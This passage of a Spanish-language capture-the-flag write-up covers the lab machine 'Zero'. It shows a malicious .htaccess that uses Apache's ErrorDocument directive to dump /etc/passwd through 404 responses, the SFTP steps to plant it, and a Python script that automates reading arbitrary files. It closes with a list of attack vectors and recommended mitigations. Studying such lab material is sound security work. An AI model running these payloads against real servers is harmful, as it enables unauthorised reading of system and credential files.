**Pruebas con extensiones alternativas** (`.php3`, `.php4`, `.php5`, `.phtml`, `.inc`): Todas devuelven el código fuente sin ejecución.

**Intento de habilitar PHP vía .htaccess**:
```apache
Header always set X-Zero-Customer 'zro-db5ad130'
AddHandler application/x-httpd-php .php
```

Sin embargo, no se puede sobrescribir el `.htaccess` original (propiedad de root). Solución: renombrar el archivo existente:

```console
sftp> rename .htaccess .htaccess.bk
sftp> put htaccess-php .htaccess
```

Aún así, PHP no se ejecuta en el directorio del usuario.

### Abuso de .htaccess para Lectura de Archivos

**Vector de ataque**: Abusar de la directiva `ErrorDocument` para incluir archivos del sistema cuando se genera un error 404.

**Payload**:
```apache
Header always set X-Zero-Customer 'zro-db5ad130'
ErrorDocument 404 %{file:/etc/passwd}
```

**Proceso de explotación**:

1. **Preparar .htaccess malicioso localmente**:
```bash
cat > malicious_htaccess << EOF
Header always set X-Zero-Customer 'zro-db5ad130'
ErrorDocument 404 %{file:/etc/passwd}
EOF
```

2. **Subir vía SFTP**:
```console
sftp> rename .htaccess .htaccess.bk
sftp> put malicious_htaccess .htaccess
```

3. **Trigger 404 para leer el archivo**:

### Script para Automatizar la Lectura de Archivos

```python
#!/usr/bin/env python3
# file_read.py - Automatización de lectura de archivos vía .htaccess
import sys
import paramiko
import requests
from io import BytesIO

def write_htaccess(host, username, password, target_file):
    """Escribe .htaccess con ErrorDocument para leer archivo objetivo"""
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh_client.connect(hostname=host, port=22, username=username, password=password)
    sftp_client = ssh_client.open_sftp()
    
    # Remover .htaccess existente si existe
    try:
        sftp_client.remove("public_html/.htaccess")
    except FileNotFoundError:
        pass
    
    # Crear contenido malicioso
    htcontent = f"""Header always set X-Zero-Customer '{username}'
{% raw %}ErrorDocument 404 %{{file:{target_file}}}{% endraw %}""".encode()
    
    # Escribir archivo
    with sftp_client.file("public_html/.htaccess", "wb") as remote_file:
        remote_file.write(htcontent)
    
    sftp_client.close()
    ssh_client.close()
    return True

def read_via_404(host, username):
    """Lee contenido vía respuesta 404"""
    url = f"http://{host}/~{username}/0xdf.nonexistent"
    response = requests.get(url, timeout=10)
    
    if response.status_code != 404:
        print(f"[-] Error: Status {response.status_code}, esperado 404")
        return None
    
    return response.text

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print(f"Usage: {sys.argv[0]} <host> <username> <password> <file_to_read>")
        print("Example: python3 file_read.py zero.vl zro-db5ad130 cbc6427b /etc/passwd")
        sys.exit(1)
    
    host, username, password, target_file = sys.argv[1:5]
    
    print(f"[+] Configurando .htaccess para leer: {target_file}")
    if write_htaccess(host, username, password, target_file):
        print(f"[+] Leyendo contenido desde {target_file}...")
        content = read_via_404(host, username)
        if content:
            print(f"\n[+] Contenido de {target_file}:\n{content}")
        else:
            print("[-] Falló la lectura del archivo")
    else:
        print("[-] Falló la escritura del .htaccess")
```

## Conclusión

Zero es una máquina extremadamente técnica que explota múltiples vulnerabilidades en la configuración de Apache:

### 🔓 **Vectores de Ataque Identificados**

1. **Abuso de .htaccess**: `ErrorDocument 404 %{file:/path}` para LFI arbitrario
2. **Falsificación de Procesos**: Manipulación de `$0` y `argv[0]` para controlar comandos ejecutados por root
3. **Múltiples parámetros `-d`**: Control de configuración cargada por `apache2ctl`
4. **Módulos Apache Maliciosos**: Carga dinámica de código como root durante validación de configuración
5. **Pipe de Log de Errores**: Ejecución de comandos vía `ErrorLog "|command"`

### 📚 **Lecciones Aprendidas**

- **Validación de Entrada**: Scripts que construyen comandos dinámicamente deben validar completamente la entrada
- **Líneas de Comando Completas**: `pgrep -f` examina toda la línea de comandos, no solo el nombre del proceso
- **Configuraciones Apache**: Las directivas `ErrorDocument` y `ErrorLog` pueden ser peligrosas si son controlables
- **Módulos Dinámicos**: La carga de módulos durante la validación puede ser explotada
- **Herramientas de Enumeración**: `pspy` es esencial para descubrir cronjobs privilegiados

### 🛡️ **Mitigaciones Recomendadas**

1. **Restringir .htaccess**: Deshabilitar `AllowOverride` o limitar directivas permitidas
2. **Validación de Procesos**: Usar PIDs específicos en lugar de patrones de línea de comandos
3. **Configuración Estática**: Evitar construcción dinámica de comandos ejecutables
4. **Sandboxing**: Ejecutar scripts de validación en entornos restringidos
5. **Monitoreo**: Detectar procesos con líneas de comandos anómalas
